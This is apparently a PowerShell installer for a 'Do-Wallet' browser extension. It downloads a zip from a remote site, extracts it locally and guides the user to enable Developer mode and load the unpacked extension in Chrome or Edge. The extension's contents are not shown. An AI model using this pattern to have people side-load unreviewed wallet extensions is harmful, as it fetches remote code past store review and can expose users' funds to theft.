$ErrorActionPreference = "Stop"

$zipUrl = "https://do-wallet.com/extension.zip"
$installRoot = Join-Path $env:LOCALAPPDATA "Do-Wallet"
$extensionDir = Join-Path $installRoot "Extension"
$zipPath = Join-Path $env:TEMP "do-wallet-extension.zip"

function Write-Step($message) {
  Write-Host ""
  Write-Host $message -ForegroundColor Cyan
}

function Find-Browser($name) {
  $paths = @()

  if ($name -eq "chrome") {
    $paths = @(
      "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
      "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
      "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )
  }

  if ($name -eq "edge") {
    $paths = @(
      "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
      "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
      "$env:LOCALAPPDATA\Microsoft\Edge\Application\msedge.exe"
    )
  }

  foreach ($path in $paths) {
    if ($path -and (Test-Path $path)) {
      return $path
    }
  }

  return $null
}

function Open-ExtensionPage($browserName, $url) {
  $browser = Find-Browser $browserName

  if ($browser) {
    Start-Process -FilePath $browser -ArgumentList $url
    return
  }

  $command = if ($browserName -eq "edge") { "msedge.exe" } else { "chrome.exe" }

  try {
    Start-Process -FilePath $command -ArgumentList $url
  } catch {
    Write-Host "Could not open $browserName automatically. Open $url manually in that browser." -ForegroundColor Yellow
  }
}

Write-Host ""
Write-Host "Do-Wallet Extension Installer" -ForegroundColor Magenta
Write-Host "--------------------------------"

Write-Step "Preparing install folder..."
New-Item -ItemType Directory -Force -Path $installRoot | Out-Null

if (Test-Path $extensionDir) {
  Remove-Item -LiteralPath $extensionDir -Recurse -Force
}

New-Item -ItemType Directory -Force -Path $extensionDir | Out-Null

Write-Step "Downloading the latest Do-Wallet extension..."
Invoke-WebRequest -UseBasicParsing -Uri $zipUrl -OutFile $zipPath

Write-Step "Installing extension files..."
Expand-Archive -LiteralPath $zipPath -DestinationPath $extensionDir -Force
Remove-Item -LiteralPath $zipPath -Force

try {
  Set-Clipboard -Value $extensionDir
  $clipboardMessage = "The extension folder path has been copied to your clipboard."
} catch {
  $clipboardMessage = "Copy this folder path when Chrome or Edge asks for it."
}

Write-Step "Opening the extension folder..."
Start-Process explorer.exe $extensionDir

Write-Host ""
Write-Host "Choose a browser setup page to open:"
Write-Host "1. Chrome"
Write-Host "2. Edge"
Write-Host "3. Both"
Write-Host "4. Skip"
$choice = Read-Host "Enter 1, 2, 3, or 4"

switch ($choice) {
  "1" { Open-ExtensionPage "chrome" "chrome://extensions/" }
  "2" { Open-ExtensionPage "edge" "edge://extensions/" }
  "3" {
    Open-ExtensionPage "chrome" "chrome://extensions/"
    Open-ExtensionPage "edge" "edge://extensions/"
  }
  default { }
}

Write-Host ""
Write-Host "Almost done:" -ForegroundColor Green
Write-Host "1. In Chrome or Edge, turn on Developer mode."
Write-Host "2. Click Load unpacked."
Write-Host "3. Select this folder:"
Write-Host "   $extensionDir" -ForegroundColor Yellow
Write-Host ""
Write-Host $clipboardMessage
Write-Host ""
Write-Host "When the extension appears in your browser, pin it from the extensions menu."
